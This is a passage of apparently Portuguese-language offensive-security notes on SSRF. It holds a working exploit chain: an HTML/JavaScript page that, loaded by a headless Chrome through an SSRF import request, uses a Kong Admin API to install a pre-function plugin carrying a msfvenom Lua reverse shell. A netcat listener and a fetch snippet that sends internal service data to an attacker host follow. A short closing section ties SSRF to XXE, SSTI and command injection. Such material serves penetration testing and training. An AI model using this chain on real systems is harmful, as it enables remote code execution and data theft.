# GET /services → listar services
# GET /plugins → verificar se pre-function está habilitado
curl -s "http://KONG-ADMIN:8001/plugins" | jq '.data[].name'
# se retornar "pre-function" → plugin disponível
```

### Payload HTML para Headless Chrome

Hospedar em servidor Kali (`python3 -m http.server 8080`):

```html
<!-- exploit.html -->
<html><body><script>
const KONG = "http://172.16.16.X:8001";
const ATTACKER = "http://KALI_IP:4444";

async function createService() {
  const r = await fetch(KONG + "/services", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({name: "pwn-svc", url: "http://127.0.0.1"})
  });
  return (await r.json()).id;
}

async function createRoute(svcName) {
  await fetch(KONG + "/services/" + svcName + "/routes", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({paths: ["/pwn-trigger"]})
  });
}

async function createPlugin(svcName, luaShell) {
  await fetch(KONG + "/services/" + svcName + "/plugins", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      name: "pre-function",
      config: {access: [luaShell]}
    })
  });
}

// Lua shell gerado com: msfvenom -p cmd/unix/reverse_lua lhost=KALI lport=PORT -f raw
const luaPayload = "LUA_SHELL_AQUI";

createService()
  .then(id => createRoute("pwn-svc"))
  .then(() => createPlugin("pwn-svc", luaPayload))
  .then(() => fetch("http://KONG-PROXY/pwn-trigger"));
</script></body></html>
```

### Trigger via SSRF

```bash
# fazer o app importar a URL do exploit.html do Kali
# isso envia para o Render Service que abre no Headless Chrome
POST /files/import
{"url": "http://KALI_IP:8080/exploit.html"}

# listener para o reverse shell Lua
nc -lvnp 4444
```

### Exfiltração via Headless Chrome (sem RCE direto)

```javascript
// JS para exfiltrar dados de serviço interno via headless browser
fetch("http://INTERNAL-SERVICE:PORT/api/data")
  .then(r => r.text())
  .then(data => fetch("http://KALI/cb?d=" + encodeURIComponent(data)));
```

---

## Módulos Relacionados

XXE pode ser encadeado com SSRF quando a entidade externa XML aponta para um recurso interno — o parser XML vira o cliente HTTP involuntário. A combinação SSRF + SSTI é possível quando o servidor busca conteúdo externo controlado pelo atacante e o renderiza dentro de um template engine. Command Injection e SSRF exploram o servidor como executor de operações não intencionadas, mas em camadas distintas: SSRF opera na camada de rede (o servidor faz requisições HTTP), enquanto Command Injection opera na camada de OS (o servidor executa comandos de shell). Referências normativas: OWASP Top 10 A10:2021 — Server-Side Request Forgery; CWE-918: Server-Side Request Forgery (SSRF); CVE referência: Capital One breach (2019) — SSRF + IMDSv1.
